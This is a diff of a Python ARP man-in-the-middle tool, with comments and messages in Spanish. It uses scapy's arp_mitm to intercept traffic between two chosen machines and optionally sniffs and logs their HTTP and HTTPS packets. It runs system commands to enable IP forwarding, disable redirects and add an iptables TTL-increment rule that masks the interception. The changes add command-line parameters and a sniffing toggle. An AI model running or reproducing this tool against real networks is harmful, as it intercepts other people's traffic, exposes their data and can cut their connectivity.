@@ -1,14 +1,21 @@
 #!/usr/bin/env -S python3
 import threading
-from scapy.all import *
+from scapy.all import sniff,arp_mitm
 import re
 from socket import gethostbyaddr,herror
 from platform import system
-from subprocess import check_output
+import subprocess
 from colorama import init,Fore
 import signal
+import parametros
+import sys
  
 init()
+
+# esta herramienta es un experimento en toda regla
+# el objetivo de esta utilidad fue meramente con fines de curiosidad y
+# sin ideas maliciosas, es por esto que no me hago responzable de su mal uso
+# Autor : Urb@n -- "estamos hack" -- https://www.github.com/Urban20/
  
 logo = '''
 \033[0;40;35m
@@ -21,9 +28,11 @@ logo = '''
 \033[0;40;31m[+] por Urb@n --> https://github.com/Urban20                                      
  
 \033[33m[X] ADVERTENCIA\nesta herramienta puede afectar la conexion de la maquina objetivo al inteceptar paquetes, dejandola sin internet o con una señal debil mientras dure el ataque
-'''
-ejecutando = True
+''' + Fore.RESET
 
+# variables y config
+sys.stderr = open('stderr.log','w')
+ejecutando = True
 #incremento de ttl
 inc_ttl= '10'
 
@@ -43,7 +52,7 @@ def salir(señal, frame):
             
       subprocess.run(x,shell=True)
    ejecutando = False
-   exit(0)
+   sys.exit(0)
    
 
 def guardar(data):
@@ -64,7 +73,7 @@ def ataque(ip1,ip2):
       print(f'\n\033[0;40;31m[-] ocurrio un error durante el ataque >> {e}\033[0m\n')
       print('\n\033[0;40;33m[X] ADVERTENCIA:\nla herramienta no se finalizo correctamente\033[0m\n')
       ejecutando = False
-      exit(1)
+      sys.exit(1)
  
 def informacion(paquete):
    'informacion de los paquetes HTTPS formateados con re'
@@ -111,45 +120,57 @@ def sniffing_HTTPS():
 def ejecucion(maq1,maq2):
  
    threading.Thread(target=ataque,args=(maq1,maq2)).start()
-   threading.Thread(target=sniffing_HTTPS).start()
-   threading.Thread(target=sniffing_HTTP).start()
+   if parametros.param.sniff:
+      print(Fore.GREEN + "se habilita el sniffing de los sistemas objetivos\n" + Fore.RESET)
+      threading.Thread(target=sniffing_HTTPS).start()
+      threading.Thread(target=sniffing_HTTP).start()
+   else: print(Fore.GREEN + "solo estamos atacando con mitm\n" + Fore.RESET)
  
  
 if __name__ == '__main__':
-   print(logo)
-   ipv4s = []
-   guardado = False
-   if system() == 'Linux':
+   try:
+      print(logo)
+      ipv4s = []
+      guardado = False
+      if system() == 'Linux':
 
-      if check_output('whoami',text=True).strip() == 'root': 
+         if subprocess.check_output('whoami',text=True).strip() == 'root': 
 
-         signal.signal(signal.SIGINT,salir)
+            signal.signal(signal.SIGINT,salir)
 
-         maq1 = str(input(Fore.WHITE+'[#] maquina A (ipv4) >> ')).strip()
-         maq2 = str(input(Fore.WHITE+'[#] maquina B (ipv4) >> ')).strip()
-         preg = str(input('[0] para guardar info de paquetes HTTPS en .txt >> ')).strip()
+            maq1 = parametros.param.maq1
+            maq2 = parametros.param.maq2
 
-         ipv4s.append(maq1)
-         ipv4s.append(maq2)
+            if maq1 is None or maq2 is None:
+               print("\nagrega el parametro -h para ver los comandos\n")
+               sys.exit(0)
 
-         if preg == '0':
-            guardado = True
-            n_arch = str(input('[#] nombre que tendra el archivo >> ')).strip()
+            preg = str(input('[0] para guardar info de paquetes HTTPS en .txt >> ')).strip()
+
+            ipv4s.append(maq1)
+            ipv4s.append(maq2)
+
+            if preg == '0':
+               guardado = True
+               n_arch = str(input('[#] nombre que tendra el archivo >> ')).strip()
+            else:
+               n_arch = None
+
+            print('\033[0m')
+            for x in ['sysctl net.ipv4.conf.all.send_redirects=0',
+               'sysctl net.ipv4.ip_forward=1',
+               f'iptables -t mangle -A PREROUTING -j TTL --ttl-inc {inc_ttl}']:
+    
+               if subprocess.run(x,shell=True).returncode != 0:
+                  print(f'\n[+] no se pudo configurar correctamente el comando {x}\n')
+    
+            print('\n\033[0;32m[+] iniciando ataque ...\033[0m\n\033[0;40;35mCTRL + c para finalizar\033[0m\n')
+            ejecucion(maq1,maq2)
          else:
-            n_arch = None
-
-         print('\033[0m')
-         for x in ['sysctl net.ipv4.conf.all.send_redirects=0',
-            'sysctl net.ipv4.ip_forward=1',
-            f'iptables -t mangle -A PREROUTING -j TTL --ttl-inc {inc_ttl}']:
- 
-            if subprocess.run(x,shell=True).returncode != 0:
-               print(f'\n[+] no se pudo configurar correctamente el comando {x}\n')
- 
-         print('\n\033[0;32m[+] iniciando ataque ...\033[0m\n\033[0;40;35mCTRL + c para finalizar\033[0m\n')
-         ejecucion(maq1,maq2)
+            print('\n\033[0;40;31m[+] no soy root (requiere sudo)\n')
       else:
-         print('\n\033[0;40;31m[+] no soy root (requiere sudo)\n')
-   else:
-      print('\n\033[0;40;31m[+] sistema operativo incompatible (solo kernel de Linux)\n')
-      
+         print('\n\033[0;40;31m[+] sistema operativo incompatible (solo kernel de Linux)\n')
+   
+   except KeyboardInterrupt:
+      print('\nse detuvo el programa\n')
+      sys.exit(0)
